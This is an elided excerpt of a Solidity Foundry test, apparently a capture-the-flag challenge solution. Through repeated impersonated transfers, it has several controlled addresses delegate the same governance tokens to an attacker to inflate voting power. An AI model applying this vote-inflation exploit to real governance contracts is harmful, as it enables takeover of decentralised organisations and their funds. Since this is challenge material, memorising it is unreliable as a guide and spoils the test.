...
contract Testing is Test {
    ...
    function testChallengeExploit() public {
        ...
        // I have 500 governance tokens and 3 WLed addresses
        // Admin has 2k governance tokens and 1 WLed address
        console.log(attacker, o1, o2);
        vm.prank(attacker);
        ...
        governanceToken.delegate(attacker);
        vm.prank(o1);
        governanceToken.transfer(o2, 500e18);
        vm.prank(o2);
        governanceToken.delegate(attacker);
        vm.prank(attacker);
        ...
        governanceToken.delegate(attacker);
        //vm.prank(o2);
        //governanceToken.transfer(adminUser, 500e18);
        validation();
    }
